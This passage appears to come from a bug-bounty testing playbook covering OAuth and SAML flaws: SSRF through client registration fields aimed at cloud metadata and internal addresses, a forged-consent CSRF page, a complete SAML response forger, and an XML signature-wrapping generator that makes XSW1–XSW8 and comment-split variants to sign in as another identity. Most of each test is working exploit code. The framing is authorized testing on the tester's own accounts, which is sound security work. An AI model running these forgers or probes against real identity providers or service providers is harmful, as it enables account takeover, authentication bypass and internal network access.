  # 4. the token endpoint reads jwks_uri to check a client assertion (any signature: the fetch is the signal)
  curl -sS "${HDR[@]}" -X POST "$TK" -d grant_type=client_credentials --data-urlencode "client_id=$CID" \
    -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    -d client_assertion=eyJhbGciOiJSUzI1NiIsImtpZCI6Im9hdTAxMSJ9.eyJpc3MiOiJ4In0.c2ln -o /dev/null -w 'client assertion %{http_code}\n'
  # 5. read the interactsh log per label; for a label that fired, put internal addresses in that field through the management URI
  F='<field that fired from the provider, e.g. sector_identifier_uri>'      # an array field (request_uris) takes [$u]
  RCU=$(jq -r .registration_client_uri "$D/reg-resp.json"); RAT=$(jq -r .registration_access_token "$D/reg-resp.json")
  for u in "http://oau011-control.$OOB/" 'http://169.254.169.254/latest/meta-data/' 'http://127.0.0.1:8080/' 'http://10.255.255.1:9/'; do
    jq --arg f "$F" --arg u "$u" --arg c "$CID" '.[$f] = $u | .client_id = $c' "$D/reg.json" > "$D/upd.json"
    curl -sS "${HDR[@]}" -X PUT "$RCU" -H "Authorization: Bearer $RAT" -H "$CT" --data-binary @"$D/upd.json" \
      -o "$D/upd-$(printf %s "$u" | md5sum | cut -c1-6).json" -w "%{http_code} %{size_download} %{time_total} $u\n"; sleep 1
  done | tee "$D/oracle.txt"
  ```
  A field that is read at consent or token time needs step 3 or step 4 repeated after each update. Without dynamic
  registration, the developer console's app form takes the same labels.
- **Proof:** the `$OOB` log lines for the labels that fired, with the source address in the provider's range and
  its User-Agent, next to the request that set them; for High, internal content in a response or an error (a
  `sector_identifier_uri` error quoting the body, a proxied logo), or the SSR-002 oracle table for the internal
  addresses against the `10.255.255.1` control.
- **Not a finding when:** the only fetch comes from our own browser rendering the consent page (our address, a
  browser User-Agent). The fetch leaves from an image proxy or a third-party service (`third-party`). Registration
  is open and nothing is fetched: RFC 7591 allows open registration. `request_uri` is accepted only when
  registered in advance, and registration is then the path. An external callback with no internal reach is the
  primitive that SSR-001 records, not a report.
- **Escalate:** SSR-002 to SSR-005 with the field as the fetcher (#398799 was blind and paid $4,000). A logo that
  the server parses (SVG, XML): XXE (#104620). Client URLs rendered as links on the consent page accept
  `javascript:`: XSS-004 on the provider's origin (#392106). A management URI that answers for a client we do not
  own, tested with two clients of ours, is BAC-001, and changing another client's `redirect_uris` or `jwks_uri`
  takes over its users. Dynamically registered clients that skip consent: OAU-012.

### OAU-012 · The provider issues a code to a client the user never approved, without the user deciding on the consent screen

| | |
|---|---|
| **Severity** | High standalone when one visit to our page grants our client access to the victim's account with no consent decision; Medium when only basic profile scopes are granted |
| **Requires** | oauth-provider, two-accounts, browser, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #215381, #850022, #136582, #2649615 |

- **Where:** the provider's authorize endpoint and its consent page (the form, its `action`, its hidden fields,
  whether approval is a GET link or a POST with a token), `prompt_values_supported` in the discovery document, the
  clients that skip consent (first-party apps, clients the provider marks trusted), the authorized-applications
  page where a user reads and revokes grants, and a client A registered with `redirect_uri`
  `https://$OOB/oau012-cb`. B is the victim, signed in at the provider, who has never approved our client.
- **Test:** the provider may issue a code to a client only after the user decided for that client and those
  scopes, or after an earlier decision for exactly them. The decision disappears in two ways. The provider skips
  the screen: `prompt=none`, a remembered approval matched by user instead of by client and scope, or a parameter
  that marks the request approved, returns a code for our client to B. Or the approval is forgeable: the consent
  form's POST carries nothing bound to B's session, or approval is a plain GET, so a page of ours approves for B.
  Read the hidden fields too: a form that names a client or scopes other than the screen shows is forgeable in
  the same step.
- **How:**
  ```bash
  AZ='<authorization_endpoint>'; TK='<token_endpoint>'; UI='<userinfo_endpoint>'; CID='<client registered by A>'; CS='<its secret>'
  RU="https://$OOB/oau012-cb"; D="$E/evidence/$H/OAU-012"; mkdir -p "$D"
  q(){ printf 'client_id=%s&response_type=code&redirect_uri=%s&scope=openid%%20profile&state=oau012%s' "$CID" "$(jq -rn --arg v "$RU" '$v|@uri')" "$1"; }
  # 1. B has never approved our client: does any value skip the screen? (a 302 carrying code= is the hit; a 200 is the consent page)
  for x in '' '&prompt=none' '&approval_prompt=auto' '&approved=true' '&consent=granted' '&skip_consent=true' '&trusted=1'; do
    curl -sS "${HDR[@]}" $B -o "$D/screen$(printf %s "$x" | md5sum | cut -c1-6).html" -w "%{http_code} %header{location}  <= [$x]\n" "$AZ?$(q "$x")"
    sleep 1; done | tee "$D/prompt.txt"
  # 2. the consent form as B receives it: method, action, hidden fields, the approve button
  grep -hoiE '<form[^>]*>|<input[^>]*type="?hidden[^>]*>|<button[^>]*>' "$D"/screen*.html | sort -u | head -20
  # 3. the approval from another site: the form's fields re-posted by our page, without its token, in B's real browser session
  cat > "$D/poc.html" <<'EOF'
  <!doctype html><form method="POST" action="<consent form action>">
  <input type="hidden" name="client_id" value="<our client id>"><input type="hidden" name="redirect_uri" value="<our redirect_uri>">
  <input type="hidden" name="response_type" value="code"><input type="hidden" name="scope" value="openid profile">
  <input type="hidden" name="state" value="oau012"><input type="hidden" name="<approve field from step 2>" value="<its value>">
  </form><script>document.forms[0].submit()</script>
  EOF
  # B's provider session with its real cookie attributes: B signs in once, e.g. python3 -m playwright codegen --save-storage="$D/B-provider.json" "$AZ"
  cat > "$D/victim.py" <<'PY'
  # victim.py <storage state of B> <page>: open our page in B's browser and print where it ends (our redirect_uri with code= is the hit)
  import os, sys
  from playwright.sync_api import sync_playwright
  with sync_playwright() as p:
      b = p.chromium.launch(); pg = b.new_context(storage_state=sys.argv[1]).new_page()
      pg.goto('file://' + os.path.abspath(sys.argv[2])); pg.wait_for_timeout(8000); print(pg.url); b.close()
  PY
  python3 "$D/victim.py" "$D/B-provider.json" "$D/poc.html" | tee "$D/landing.txt"
  # 4. a code for B from step 1 or 3 (the $OOB log line for /oau012-cb, or landing.txt): redeem it with our client, ask whose it is
  C='<code>'; curl -sS "${HDR[@]}" -u "$CID:$CS" -X POST "$TK" -d grant_type=authorization_code --data-urlencode "code=$C" \
    --data-urlencode "redirect_uri=$RU" -o "$D/token.json"
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $(jq -r .access_token "$D/token.json")" "$UI" | head -c 300; echo
  ```
  Revoke our client on B's authorized-applications page before each run, or a remembered approval explains the
  code.
- **Proof:** the request that produced a code with no decision (the `prompt.txt` line with `code=` in `Location`,
  or `poc.html` with `landing.txt` ending on our `redirect_uri` with a code), the `userinfo` response naming B for
  the redeemed token, and B's authorized-applications page listing our client. B never saw or clicked the consent
  screen in that run.
- **Not a finding when:** `prompt=none` returns `consent_required` or `interaction_required`. Consent is skipped
  only for the programme's own first-party clients, by design, and ours is not one. B approved our client before
  for the same scopes. The forged POST is refused for a missing or foreign token, or B's session cookie is
  `SameSite=Lax` or `Strict` and the browser did not send it: write the protection. An approval that needs B to
  click inside our page (clickjacking, double-click) is `clickjacking`: Graveyard.
- **Escalate:** the scopes our client now holds on B's account are the impact (OAU-010). With
  `response_type=token`, no redemption is needed (OAU-003). Open dynamic registration (OAU-011) plus consent
  skipped for registered clients puts any account one visit away. A first-party client id that skips consent by
  design, with a foreign `redirect_uri` accepted (OAU-001), is the same grant without a decision: one chain.

### OAU-013 · The service provider signs in the NameID of a SAML response that the configured identity provider did not sign

| | |
|---|---|
| **Severity** | Critical standalone: an unsigned or self-signed response opens any account of the service provider, administrators included (shown on an identity of ours) |
| **Requires** | saml |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Verification of Cryptographic Signature · CWE-347 |
| **Prior art** | #223014, #812064 |

- **Where:** the assertion consumer service (`/saml/acs`, `/saml/consume`, `/sso/saml`, `/saml2/acs`,
  `/Shibboleth.sso/SAML2/POST`, Spring's `/login/saml2/sso/<id>`, simpleSAMLphp's
  `/simplesaml/module.php/saml/sp/saml2-acs.php/<sp>`, per-tenant forms such as `/sso/<org>/acs`). The SP metadata
  from the probe gives the SP's entityID (the Audience) and the ACS URL. The identity provider's entityID comes
  from its metadata or from the SP's configuration (Okta uses `http://www.okta.com/<app id>`, the id visible in the
  AuthnRequest's Destination; Entra ID uses `https://sts.windows.net/<tenant id>/`). The NameID we assert is an
  identity of ours: B's address on a product with accounts, or, on a staff-only SP, an address on a domain of ours
  that names no real person. On a multi-tenant SP the target is tenant B's ACS, with B's SSO connected to an
  identity provider of ours whose key this test never uses.
- **Test:** signature verification is the only thing that makes a SAML response more than a form post. Send the
  SP responses that the configured identity provider never signed and see which NameID it accepts: (1) as the
  control that must fail, a response signed with our key and no certificate in it; (2) no signature at all; (3)
  our signature with our certificate in `KeyInfo`, on the assertion and then on the response; (4) a signature by
  another identity provider the SP trusts for someone else, such as our own tenant's. The SP's errors tell which
  check refused each one: "user not found" or "not provisioned" means the signature check passed.
- **How:**
  ```bash
  D="$E/evidence/$H/OAU-013"; mkdir -p "$D" "$E/tools"; ME="$T/api/me"
  ACS='<ACS URL>'; SPID='<SP entityID>'; IDP='<entityID of the identity provider the SP trusts>'; WHO='<an identity of ours, see Where>'
  START='<SP-initiated sign-in URL that redirects to the identity provider, or empty>'
  openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj '/CN=oau013' -keyout "$D/our.key" -out "$D/our.crt" 2>/dev/null
  [ -s "$E/tools/saml-forge.py" ] || cat > "$E/tools/saml-forge.py" <<'PY'
  # saml-forge.py ACS SP_ENTITY_ID IDP_ENTITY_ID NAMEID [KEY.pem CERT.pem]: print a base64 SAMLResponse whose assertion
  # names NAMEID (also sent as email, mail and the WS-Fed emailaddress attribute). With KEY and CERT it is signed
  # (RSA-SHA256, exclusive c14n). Env: SAML_SIGN=assertion|response|both (default assertion), SAML_KEYINFO=0 to leave
  # the certificate out, SAML_IRT=<AuthnRequest ID> for InResponseTo, SAML_MIN=<minutes valid> (default 5).
  import base64, datetime as dt, hashlib, os, sys, uuid
  from lxml import etree
  from cryptography import x509
  from cryptography.hazmat.primitives import hashes, serialization
  from cryptography.hazmat.primitives.asymmetric import padding
  acs, sp, idp, who, *kc = sys.argv[1:]
  P, A, DS = ('urn:oasis:names:tc:SAML:2.0:protocol', 'urn:oasis:names:tc:SAML:2.0:assertion', 'http://www.w3.org/2000/09/xmldsig#')
  now = dt.datetime.now(dt.timezone.utc).replace(microsecond=0, tzinfo=None); ts = lambda t: t.isoformat() + 'Z'
  end = ts(now + dt.timedelta(minutes=int(os.environ.get('SAML_MIN', '5')))); rid, aid = '_' + uuid.uuid4().hex, '_' + uuid.uuid4().hex
  irt = f' InResponseTo="{os.environ["SAML_IRT"]}"' if os.environ.get('SAML_IRT') else ''
  attrs = ''.join(f'<saml:Attribute Name="{n}"><saml:AttributeValue>{who}</saml:AttributeValue></saml:Attribute>' for n in
                  ('email', 'mail', 'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress'))
  doc = etree.fromstring(f'''<samlp:Response xmlns:samlp="{P}" xmlns:saml="{A}" ID="{rid}" Version="2.0" IssueInstant="{ts(now)}" Destination="{acs}"{irt}>
  <saml:Issuer>{idp}</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion ID="{aid}" Version="2.0" IssueInstant="{ts(now)}"><saml:Issuer>{idp}</saml:Issuer>
  <saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{who}</saml:NameID>
  <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="{end}" Recipient="{acs}"{irt}/></saml:SubjectConfirmation></saml:Subject>
  <saml:Conditions NotBefore="{ts(now - dt.timedelta(minutes=2))}" NotOnOrAfter="{end}"><saml:AudienceRestriction><saml:Audience>{sp}</saml:Audience></saml:AudienceRestriction></saml:Conditions>
  <saml:AuthnStatement AuthnInstant="{ts(now)}" SessionIndex="{aid}"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>
  <saml:AttributeStatement>{attrs}</saml:AttributeStatement></saml:Assertion></samlp:Response>''')
  def sign(el):            # enveloped signature placed after the element's Issuer, as the SAML schema orders it
      key = serialization.load_pem_private_key(open(kc[0], 'rb').read(), None)
      der = x509.load_pem_x509_certificate(open(kc[1], 'rb').read()).public_bytes(serialization.Encoding.DER)
      c14n = lambda e: etree.tostring(e, method='c14n', exclusive=True, with_comments=False)
      dig = base64.b64encode(hashlib.sha256(c14n(el)).digest()).decode()
      ki = '' if os.environ.get('SAML_KEYINFO') == '0' else f'<ds:KeyInfo><ds:X509Data><ds:X509Certificate>{base64.b64encode(der).decode()}</ds:X509Certificate></ds:X509Data></ds:KeyInfo>'
      s = etree.fromstring(f'''<ds:Signature xmlns:ds="{DS}"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
  <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#{el.get('ID')}"><ds:Transforms>
  <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>
  <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>{dig}</ds:DigestValue></ds:Reference></ds:SignedInfo>
  <ds:SignatureValue/>{ki}</ds:Signature>''')
      el.find(f'{{{A}}}Issuer').addnext(s)
      si = s.find(f'{{{DS}}}SignedInfo')
      s.find(f'{{{DS}}}SignatureValue').text = base64.b64encode(key.sign(c14n(si), padding.PKCS1v15(), hashes.SHA256())).decode()
  mode = os.environ.get('SAML_SIGN', 'assertion')
  if kc and mode in ('assertion', 'both'): sign(doc.find(f'{{{A}}}Assertion'))
  if kc and mode in ('response', 'both'): sign(doc)
  print(base64.b64encode(etree.tostring(doc)).decode())
  PY
  send(){ # send <label> [key cert]: start at the SP when START is set (InResponseTo from its AuthnRequest), post the response, ask who we are
    J="$D/$1.jar"; rm -f "$J"; IRT=
    if [ -n "$START" ]; then L=$(curl -sS "${HDR[@]}" -c "$J" -o /dev/null -w '%header{location}' "$START")
      IRT=$(python3 -c 'import sys, zlib, base64, re, urllib.parse as u
  q = dict(u.parse_qsl(u.urlsplit(sys.argv[1]).query)); x = zlib.decompress(base64.b64decode(q["SAMLRequest"]), -15).decode()
  print(re.search(r"\sID=\"([^\"]+)\"", x).group(1))' "$L" 2>/dev/null); fi
    R=$(SAML_IRT="$IRT" python3 "$E/tools/saml-forge.py" "$ACS" "$SPID" "$IDP" "$WHO" "${@:2}")
    curl -sS "${HDR[@]}" -b "$J" -c "$J" -o "$J.body" -w "$1 %{http_code} %header{location}\n" -X POST "$ACS" --data-urlencode "SAMLResponse=$R"
    grep -ioE '(signature|certificate|issuer|audience|provisioned|not found|unknown user|expired)[^<"]{0,80}' "$J.body" | head -3
    curl -sS "${HDR[@]}" -b "$J" "$ME" | head -c 200; echo; sleep 1; }
  SAML_KEYINFO=0 send control "$D/our.key" "$D/our.crt"                # our signature, no certificate: must fail as a bad signature
  send unsigned
  send keyinfo-assertion "$D/our.key" "$D/our.crt"
  SAML_SIGN=response send keyinfo-response "$D/our.key" "$D/our.crt"
  SAML_SIGN=both send other-idp '<key of an identity provider of ours that the SP trusts for our own tenant>' '<its certificate>'
  ```
  A start that answers with an HTML form (POST binding) carries the AuthnRequest in its `SAMLRequest` field; an
  SP that also needs the `RelayState` the start produced gets it as a second `--data-urlencode` field.
- **Proof:** the forged response, decoded, and the SP's answer to it: a session whose identity call names B, or on
  a staff-only SP the error that only follows a passed signature check ("user oau013@<our domain> is not
  provisioned"), next to the control's bad-signature error. Each request is saved raw.
- **Not a finding when:** every variant gets the control's error. Our own tenant's SSO settings let its admin turn
  signature checks off for that tenant: an admin's choice about their own users, which matters only if it reaches
  another tenant. The response lands in an account that our own tenant's identity provider may assert anyway:
  OAU-005 decides whether it may. The SP is a vendor's hosted service on the vendor's own domain
  (`third-party`).
- **Escalate:** OAU-014 with a response that the identity provider really signed. XXE-009 on the same endpoint,
  where the DOCTYPE is parsed before any signature check. An administrator NameID is the impact to describe, not to
  assert: name the admin route from the documentation and stay on our own identities.

### OAU-014 · A validly signed SAML response is accepted for an identity, a service provider or a moment that its signed assertion does not name

| | |
|---|---|
| **Severity** | Critical standalone when a wrapped or comment-split response signed for A opens B's account; High when a response issued for another service provider of the same identity provider opens this one; Low when a response is accepted twice, late, or in a session that never asked for it (login CSRF and replay need a captured response) |
| **Requires** | saml, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Improper Verification of Cryptographic Signature · CWE-347 |
| **Prior art** | #2579939, #3827674, #356284, #888930 |

- **Where:** the ACS from OAU-013 and a signed response for our account A from a normal sign-in: the browser's POST
  of `SAMLResponse` to the ACS, captured before it is sent so that it stays unspent. B is our second identity at the
  same identity provider. For the comment split, A's identifier must begin with B's: user names `oau014` and
  `oau014x`, or B `oau014@<our domain>` and A `oau014@<our domain>.<a second domain of ours>`. For the audience
  check, another SP of the same identity provider that we can sign in to (another application of the programme
  behind the same IdP, or an SP of ours registered there).
- **Test:** the signature covers one element; the SP must read the identity, the audience, the recipient and the
  validity window from that same element, and use each response once. Keep the identity provider's signature
  intact and change what the SP reads: (1) signature wrapping, an unsigned copy naming B placed where a naive SP
  reads first while the signed original sits elsewhere (the XSW1 to XSW8 shapes); (2) a comment inside the NameID,
  which exclusive canonicalization drops before the digest, so an SP that reads the first text node gets B's
  identifier; (3) the binding checks: the same response twice, after its `NotOnOrAfter`, from a session that did
  not start the sign-in (`InResponseTo`), and a response issued to another SP. Each variant needs a fresh
  response: an SP that remembers assertion IDs refuses the second use before it checks anything else.
- **How:**
  ```bash
  D="$E/evidence/$H/OAU-014"; mkdir -p "$D" "$E/tools"; ME="$T/api/me"
  ACS='<ACS URL, exactly as the browser posts to it>'; START='<SP-initiated sign-in URL>'; EB='<B identifier exactly as the IdP writes NameIDs>'
  cat > "$D/saml-capture.py" <<'PY'
  # saml-capture.py <start url> <acs url> <out file> <profile dir>: the POST to the ACS is aborted and saved unspent, with the SP cookies as a curl jar
  import sys, urllib.parse as u
  from playwright.sync_api import sync_playwright
  start, acs, out, prof = sys.argv[1:5]; got = []
  def grab(route):
      got.append(dict(u.parse_qsl(route.request.post_data or '')).get('SAMLResponse', '')); route.abort()
  with sync_playwright() as p:
      c = p.chromium.launch_persistent_context(prof, headless=False); c.route(lambda x: x.split('?')[0] == acs, grab)
      pg = c.new_page(); pg.goto(start)
      for _ in range(300):              # first run: sign in at the identity provider as A; later runs reuse its session in the profile
          if got: break
          pg.wait_for_timeout(1000)
      open(out, 'w').write(got[0] if got else '')
      with open(out + '.jar', 'w') as f:  # the SP session that started this sign-in, for curl
          for k in c.cookies(acs):
              f.write('\t'.join([k['domain'], 'TRUE' if k['domain'].startswith('.') else 'FALSE', k['path'],
                                 'TRUE' if k['secure'] else 'FALSE', str(max(int(k['expires']), 0)), k['name'], k['value']]) + '\n')
      c.close()
  PY
  [ -s "$E/tools/saml-xsw.py" ] || cat > "$E/tools/saml-xsw.py" <<'PY'
  # saml-xsw.py SIGNED_RESPONSE NEW_IDENTITY OUT_DIR: from one signed SAMLResponse of ours (base64 or XML), write
  # base64 variants that keep the identity provider's signature intact and carry NEW_IDENTITY where a service provider
  # may read it: the XSW1-XSW8 shapes, plus a comment split of the NameID when NEW_IDENTITY is a prefix of the signed one.
  import base64, copy, os, sys, uuid
  from lxml import etree
  src, new, out = sys.argv[1:4]
  P, A, DS = ('urn:oasis:names:tc:SAML:2.0:protocol', 'urn:oasis:names:tc:SAML:2.0:assertion', 'http://www.w3.org/2000/09/xmldsig#')
  raw = open(src, 'rb').read().strip(); raw = raw if raw.startswith(b'<') else base64.b64decode(raw)
  parse = lambda: etree.fromstring(raw, etree.XMLParser(resolve_entities=False, no_network=True))
  q = lambda ns, n: f'{{{ns}}}{n}'
  def unsign(el):                         # remove el's own Signature, keeping the text after it (the digest covers that text)
      s = el.find(q(DS, 'Signature'))
      if s is None: return None
      p = s.getprevious()
      if s.tail:
          if p is not None: p.tail = (p.tail or '') + s.tail
          else: el.text = (el.text or '') + s.tail
      s.tail = None; el.remove(s); return s
  def evil(el, keep_sig=False):           # a copy naming NEW_IDENTITY, unsigned and with a fresh ID unless keep_sig
      e = copy.deepcopy(el); old = (e.findtext(f'.//{q(A, "NameID")}') or '').strip()
      if not keep_sig: unsign(e); e.set('ID', '_' + uuid.uuid4().hex)
      for n in e.iter(q(A, 'NameID'), q(A, 'AttributeValue')):
          if n.text and old and n.text.strip() == old: n.text = new
      return e
  def write(name, root):
      open(os.path.join(out, name + '.b64'), 'w').write(base64.b64encode(etree.tostring(root)).decode()); print('wrote', name)
  os.makedirs(out, exist_ok=True)
  if parse().find(q(DS, 'Signature')) is not None:                     # the Response itself is signed
      for name, first in (('xsw1-signed-response-last', False), ('xsw2-signed-response-first', True)):
          ev = evil(parse()); orig = parse()
          (ev.find(q(A, 'Issuer')).addnext(orig) if first else ev.append(orig)); write(name, ev)
  if parse().find(f'{q(A, "Assertion")}/{q(DS, "Signature")}') is not None:   # the Assertion is signed
      def fresh():
          r = parse(); return r, r.find(q(A, 'Assertion'))
      r, a = fresh(); a.addprevious(evil(a)); write('xsw3-unsigned-copy-first', r)
      r, a = fresh(); e = evil(a); e.set('ID', a.get('ID')); a.addprevious(e); write('xsw3b-copy-first-same-id', r)
      r, a = fresh(); e = evil(a); a.addprevious(e); r.remove(a); e.append(a); write('xsw4-signed-inside-copy', r)
      r, a = fresh(); e = evil(a, keep_sig=True); u = copy.deepcopy(a); unsign(u)
      a.addprevious(e); r.remove(a); r.append(u); write('xsw5-changed-signed-first-original-last', r)
      r, a = fresh(); e = evil(a, keep_sig=True); u = copy.deepcopy(a); unsign(u)
      a.addprevious(e); r.remove(a); e.find(q(DS, 'Signature')).append(u); write('xsw6-original-inside-signature', r)
      r, a = fresh(); x = etree.SubElement(r, q(P, 'Extensions')); r.remove(x); st = r.find(q(P, 'Status'))
      (st.addprevious(x) if st is not None else a.addprevious(x)); a.addprevious(evil(a)); r.remove(a); x.append(a)
      write('xsw7-signed-in-extensions', r)
      r, a = fresh(); e = evil(a); s = unsign(a); e.find(q(A, 'Issuer')).addnext(s)
      o = etree.SubElement(s, q(DS, 'Object')); a.addprevious(e); r.remove(a); o.append(a); write('xsw8-original-in-object', r)
  r = parse(); n = r.find(f'.//{q(A, "NameID")}')
  if n is not None and n.text and n.text.startswith(new) and n.text != new:     # exclusive c14n drops the comment
      for t in [n] + [v for v in r.iter(q(A, 'AttributeValue')) if v.text == n.text]:
          rest = t.text[len(new):]; t.text = new; c = etree.Comment(''); c.tail = rest; t.append(c)
      write('comment-split-nameid', r)
  PY
  post(){ # post <label> <file with the base64 SAMLResponse> [jar of the session that started it]: post to the ACS, ask who we are
    J="$D/$1.out.jar"; if [ -n "$3" ]; then cp "$3" "$J"; else : > "$J"; fi
    curl -sS "${HDR[@]}" -b "$J" -c "$J" -o "$D/$1.body" -w "$1 %{http_code} %header{location}\n" -X POST "$ACS" --data-urlencode "SAMLResponse=$(tr -d '\n' < "$2")"
    curl -sS "${HDR[@]}" -b "$J" "$ME" | head -c 200; echo; sleep 1; }
  CAP=(python3 "$D/saml-capture.py" "$START" "$ACS")
  # 1. control in its own session, the same response again (replay), then a fresh one from a jar that never started a sign-in
  "${CAP[@]}" "$D/a1" "$D/profile"; post control "$D/a1" "$D/a1.jar"; post replay "$D/a1" "$D/a1.jar"
  "${CAP[@]}" "$D/a2" "$D/profile"; post unsolicited "$D/a2"
  # 2. wrapping and comment variants naming B: list the shapes this response allows, then one fresh response of A per shape
  "${CAP[@]}" "$D/a3" "$D/profile"; python3 "$E/tools/saml-xsw.py" "$D/a3" "$EB" "$D/shapes" | tee "$D/shapes.txt"
  for v in $(sed -n 's/^wrote //p' "$D/shapes.txt"); do
    "${CAP[@]}" "$D/f-$v" "$D/profile"; python3 "$E/tools/saml-xsw.py" "$D/f-$v" "$EB" "$D/v-$v" > /dev/null
    post "$v" "$D/v-$v/$v.b64" "$D/f-$v.jar"; done
  # 3. late: a fresh response held past its NotOnOrAfter, then posted in its own session
  "${CAP[@]}" "$D/a4" "$D/profile"; base64 -d "$D/a4" | grep -oE 'NotOnOrAfter="[^"]+"' | sort -u; sleep 420; post late "$D/a4" "$D/a4.jar"
  # 4. audience: a response the same IdP issued to another SP, captured with that SP's start and ACS, posted here
  python3 "$D/saml-capture.py" '<other SP start URL>' '<other SP ACS URL>' "$D/o1" "$D/profile"; post other-audience "$D/o1"
  ```
  Signed but encrypted assertions (`EncryptedAssertion`) cannot be rewritten without the SP's key: wrap around the
  encrypted element only when the response itself is signed (XSW1 and XSW2).
- **Proof:** the variant posted (decoded, with the signed element byte for byte as the identity provider issued
  it), the SP's answer, and the identity call naming B, next to the control naming A. For the binding checks:
  the second, late or sessionless acceptance with its timestamps and the `NotOnOrAfter` and `InResponseTo` values
  of the response.
- **Not a finding when:** every shape returns the SP's signature or validation error while the control works: the
  SP reads the element it verified. The variant signs us in as A: the SP reads the signed assertion. A response
  accepted twice within its few minutes of validity, when only the victim's own browser ever holds it: low on most
  programmes (#888930); report it with a way to capture the response or not at all. An unsolicited response
  accepted by an SP configured for identity-provider-initiated sign-in: the design, login CSRF at most
  (`csrf-low`).
- **Escalate:** an administrator's NameID is the impact to describe from the documentation, not to assert.
  OAU-005 when the identity read from the wrapped assertion belongs to another tenant. XXE-009 on the same parser,
  and XXE-010 for an XSLT `Transform` inside `ds:Signature`, which runs before the signature is checked. A response
  that appears in a URL, a log or a shared proxy turns the replay into a usable capture.

### OAU-015 · The provider's ID token or user API asserts an e-mail address that the user never proved, as if it were verified

| | |
|---|---|
| **Severity** | High standalone when an address nobody proved is asserted as verified, so relying parties that match by e-mail open the owner's account (shown on our own client); Critical when a first-party relying party does so (OAU-007 on it); Medium when the address is sent with no verification flag at all |
| **Requires** | oauth-provider, signup\|account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #922456, #791775, #565883, #2676025 |

- **Where:** the claims the provider gives relying parties: the ID token's `email` and `email_verified`, the
  `userinfo_endpoint`, and for a plain OAuth provider the user API that clients read (`/api/v4/user`, `/user`,
  `/user/emails`, `/me`). The states that should keep an address out of them: a new account whose address was never
  confirmed, an e-mail change still pending, a secondary address added and not confirmed. A client we registered
  (or a first-party public client) receives the claims; Y is an address of ours whose mailbox stays closed during
  the test.
- **Test:** relying parties trust the provider to vouch for the address it sends; many match accounts by it. The
  provider must leave an unproven address out, or mark it `email_verified: false`. Put Y on an account of ours
  without opening Y's mailbox (sign up with Y, or change A's address to Y and leave it pending), complete a grant
  for our client from that account, and read what the provider asserts.
- **How:**
  ```bash
  D="$E/evidence/$H/OAU-015"; mkdir -p "$D"; DISC="$E/recon/$H/disc_.well-known_openid-configuration.json"
  AZ=$(jq -r .authorization_endpoint "$DISC"); TK=$(jq -r .token_endpoint "$DISC"); UI=$(jq -r .userinfo_endpoint "$DISC")
  CID='<our client id>'; CS='<its secret>'; RU='<its redirect_uri>'; Y='<an address of ours whose mailbox stays closed>'
  # 1. in the browser: sign up with Y and do not confirm it (or change A's address to Y and leave it pending); save that session's
  #    headers as $E/accounts/Y.headers, then approve our client once from it
  YS=(-H "@$E/accounts/Y.headers")
  # 2. a grant for our client from that account, and the claims the provider issues
  C=$(curl -sS "${HDR[@]}" "${YS[@]}" -o /dev/null -w '%header{location}' --get "$AZ" --data-urlencode "client_id=$CID" --data-urlencode response_type=code \
    --data-urlencode "redirect_uri=$RU" --data-urlencode 'scope=openid email profile' --data-urlencode state=oau015 \
    | python3 -c 'import sys, urllib.parse as u; print(dict(u.parse_qsl(u.urlsplit(sys.stdin.read()).query)).get("code", ""))')
  curl -sS "${HDR[@]}" -u "$CID:$CS" -X POST "$TK" -d grant_type=authorization_code --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU" -o "$D/token.json"
  jq -r '.id_token // empty' "$D/token.json" | cut -d. -f2 | python3 -c 'import sys, base64, json; s = sys.stdin.read().strip()
  print({k: v for k, v in json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))).items() if "email" in k or k in ("sub", "iss", "aud")} if s else "no id_token")'
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $(jq -r .access_token "$D/token.json")" "$UI" | tee "$D/userinfo.json" | jq -c '{sub, email, email_verified}'
  # 3. the provider's own view of the same account, for comparison
  curl -sS "${HDR[@]}" "${YS[@]}" "$T/api/me" | grep -oE '"(email|email_verified|confirmed|confirmed_at|unconfirmed_email|pending_email)":[^,}]*'
  ```
  For a provider without OpenID Connect, read the user API its clients use with the same access token, and look
  for the field they would match on.
- **Proof:** the decoded ID token or `userinfo.json` for the account showing `email: Y` with
  `email_verified: true`, or with no verification flag where the provider documents its `email` as verified, next
  to the provider's own account API showing Y unconfirmed; no mail to Y was opened. For Critical, a first-party
  relying party that signs Y's owner (our account B, with address Y) in from that assertion: OAU-007 run against it.
- **Not a finding when:** the claim says `email_verified: false`: correct, and a relying party that ignores it is
  that party's OAU-007. The provider omits `email` until it is confirmed. The address is vouched for another way
  the provider documents (an organisation's proved domain). The provider documents that its e-mail field is
  unverified and no first-party relying party trusts it: report the relying party that does, not the provider.
- **Escalate:** an address made verified through a bypass (AUT-014) is asserted honestly and wrongly at once:
